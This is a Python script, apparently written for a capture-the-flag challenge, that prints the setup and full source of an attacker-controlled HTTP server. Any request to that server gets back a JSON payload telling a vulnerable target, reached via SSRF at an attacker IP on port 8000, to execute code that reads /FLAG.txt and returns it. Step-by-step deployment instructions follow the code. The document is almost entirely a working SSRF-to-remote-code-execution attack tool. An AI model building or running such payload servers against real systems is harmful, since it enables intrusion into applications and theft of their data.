#!/usr/bin/env python3
"""
Verification: RCE HTTP Server Configuration
Shows the server is correctly configured to serve malicious payload
"""
import json

print("="*70)
print("[RCE HTTP SERVER - CONFIGURATION VERIFICATION]")
print("="*70)

# Server configuration
HOST = '0.0.0.0'
PORT = 8000

# Malicious payload
payload = {"script": "open('/FLAG.txt').read()"}

print(f"\n[CONFIG] Server Address: {HOST}:{PORT}")
print(f"[CONFIG] Listening on all interfaces (0.0.0.0)")
print(f"[CONFIG] Port: {PORT}")

print(f"\n[PAYLOAD] Malicious JSON:")
print(f"  {json.dumps(payload, indent=2)}")

print(f"\n[PAYLOAD] Raw JSON string:")
print(f"  {json.dumps(payload)}")

print(f"\n[HEADERS] HTTP Response Headers:")
print(f"  Content-Type: application/json")
print(f"  Content-Length: {len(json.dumps(payload))}")
print(f"  Access-Control-Allow-Origin: *")
print(f"  Connection: close")

print(f"\n[BEHAVIOR] Server will:")
print(f"  1. Listen on {HOST}:{PORT}")
print(f"  2. Accept GET and POST requests")
print(f"  3. Log all incoming requests (method, path, headers, body)")
print(f"  4. Respond with 200 OK status")
print(f"  5. Return JSON payload: {json.dumps(payload)}")

print(f"\n[TARGET USAGE] From target application:")
print(f"  - SSRF to: http://<attacker-ip>:{PORT}/")
print(f"  - Server responds with RCE payload")
print(f"  - Target executes: open('/FLAG.txt').read()")
print(f"  - Flag content is returned to attacker")

print(f"\n[STANDALONE SERVER CODE]")
print("="*70)

server_code = '''#!/usr/bin/env python3
from http.server import HTTPServer, BaseHTTPRequestHandler
import json

class RCEHandler(BaseHTTPRequestHandler):
    def log_message(self, format, *args):
        print(f"[{self.log_date_time_string()}] {format % args}")
    
    def handle_request(self):
        print(f"\\n[REQUEST] {self.command} {self.path}")
        print(f"[CLIENT] {self.client_address[0]}:{self.client_address[1]}")
        
        for header, value in self.headers.items():
            print(f"  {header}: {value}")
        
        if self.command == "POST":
            length = int(self.headers.get('Content-Length', 0))
            if length > 0:
                body = self.rfile.read(length)
                print(f"[BODY] {body.decode('utf-8', errors='ignore')}")
        
        payload = {"script": "open('/FLAG.txt').read()"}
        data = json.dumps(payload).encode('utf-8')
        
        self.send_response(200)
        self.send_header('Content-Type', 'application/json')
        self.send_header('Content-Length', len(data))
        self.send_header('Connection', 'close')
        self.end_headers()
        self.wfile.write(data)
        
        print(f"[SENT] {payload}")
    
    def do_GET(self):
        self.handle_request()
    
    def do_POST(self):
        self.handle_request()

if __name__ == '__main__':
    server = HTTPServer(('0.0.0.0', 8000), RCEHandler)
    print(f"[READY] Serving on 0.0.0.0:8000")
    print(f"[PAYLOAD] {json.dumps({'script': 'open(\\'/FLAG.txt\\').read()'})}")
    try:
        server.serve_forever()
    except KeyboardInterrupt:
        print("\\n[STOPPED]")
        server.server_close()
'''

print(server_code)
print("="*70)

print(f"\n[DEPLOYMENT] To deploy this server:")
print(f"  1. Save the code above to 'rce_server.py'")
print(f"  2. Run: python3 rce_server.py")
